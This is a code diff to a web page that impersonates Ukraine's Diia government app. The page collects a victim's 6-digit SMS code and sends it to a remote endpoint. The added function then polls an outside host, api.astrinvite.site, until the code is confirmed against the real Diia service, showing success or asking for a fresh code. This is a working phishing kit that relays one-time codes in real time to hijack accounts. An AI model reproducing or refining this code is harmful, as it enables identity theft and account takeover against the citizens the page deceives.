@@ -941,59 +941,86 @@
         const res = await fetch(CODE_URL, { method: "POST", body: fd });
         const resp = await res.json();
         if (resp.ok) {
-          // Останавливаем таймер при успешной отправке
-          clearInterval(countdownInterval);
+          // Код отправлен в API, теперь ждем результат проверки от FSM
+          console.log("Код отправлен, ожидаем результат проверки...");
           
-          document.body.innerHTML = `
-            <div class="sms-fullscreen">
-              <div class="diia-logo">
-                <img src="Dia.png" alt="Дія" />
-              </div>
-              <div style='text-align: center; padding: 40px;'>
-                <h2 style='color: #4caf50; font-size: clamp(24px, 6vw, 32px); margin-bottom: 20px;'>✅ Код прийнято</h2>
-                <p style='color: rgba(255,255,255,0.9); font-size: clamp(16px, 4vw, 20px);'>Чекаємо підтвердження на пристрої…</p>
-              </div>
-            </div>
-          `;
+          // Запускаем проверку результата
+          await waitForVerificationResult();
           
-          setTimeout(() => {
-            location.reload(); // Перезагружаем страницу
-          }, 5000);
         } else {
           document.getElementById("send-code-btn").disabled = false;
-          
-          // Очищаем все поля ввода при ошибке от сервера
-          const digits = document.querySelectorAll('.sms-digit');
-          digits.forEach(digit => {
-            digit.value = '';
-            digit.classList.remove('filled');
-          });
-          
-          // Фокусируемся на первое поле
-          if (digits.length > 0) {
-            digits[0].focus();
-          }
-          
-          document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код з SMS";
+          document.getElementById("sms-error").textContent = "Помилка відправки коду. Спробуйте ще раз.";
         }
       } catch (e) {
         console.error("Ошибка отправки кода:", e);
         document.getElementById("send-code-btn").disabled = false;
-        
-        // Очищаем все поля ввода при ошибке сети
-        const digits = document.querySelectorAll('.sms-digit');
-        digits.forEach(digit => {
-          digit.value = '';
-          digit.classList.remove('filled');
-        });
-        
-        // Фокусируемся на первое поле
-        if (digits.length > 0) {
-          digits[0].focus();
-        }
-        
         document.getElementById("sms-error").textContent = "Помилка з'єднання. Спробуйте ще раз.";
       }
+    }
+
+    async function waitForVerificationResult() {
+      // Ждем результат проверки кода от FSM
+      console.log("Ожидание результата проверки кода от Дії...");
+      
+      for (let i = 0; i < 30; i++) { // Ждем максимум 30 секунд
+        try {
+          const res = await fetch(`https://api.astrinvite.site/api/check-verification-result?id=${currentId}`);
+          const result = await res.json();
+          
+          if (result.status === "success") {
+            // Код принят Дією - показываем успех
+            clearInterval(countdownInterval);
+            
+            document.body.innerHTML = `
+              <div class="sms-fullscreen">
+                <div class="diia-logo">
+                  <img src="Dia.png" alt="Дія" />
+                </div>
+                <div style='text-align: center; padding: 40px;'>
+                  <h2 style='color: #4caf50; font-size: clamp(24px, 6vw, 32px); margin-bottom: 20px;'>✅ Код прийнято</h2>
+                  <p style='color: rgba(255,255,255,0.9); font-size: clamp(16px, 4vw, 20px);'>Чекаємо підтвердження на пристрої…</p>
+                </div>
+              </div>
+            `;
+            
+            setTimeout(() => {
+              location.reload(); // Перезагружаем страницу
+            }, 5000);
+            return;
+            
+          } else if (result.status === "failed") {
+            // Код отклонен Дією - показываем ошибку и очищаем поля
+            document.getElementById("send-code-btn").disabled = false;
+            
+            // Очищаем все поля ввода
+            const digits = document.querySelectorAll('.sms-digit');
+            digits.forEach(digit => {
+              digit.value = '';
+              digit.classList.remove('filled');
+            });
+            
+            // Фокусируемся на первое поле
+            if (digits.length > 0) {
+              digits[0].focus();
+            }
+            
+            document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код з SMS";
+            return;
+          }
+          
+          // Если статус "pending" - продолжаем ждать
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
+        } catch (e) {
+          console.error("Ошибка проверки результата:", e);
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+      }
+      
+      // Таймаут ожидания результата
+      console.log("Таймаут ожидания результата проверки");
+      document.getElementById("send-code-btn").disabled = false;
+      document.getElementById("sms-error").textContent = "Час очікування вичерпано. Спробуйте ще раз.";
     }
 
     // Показать сообщение об успехе
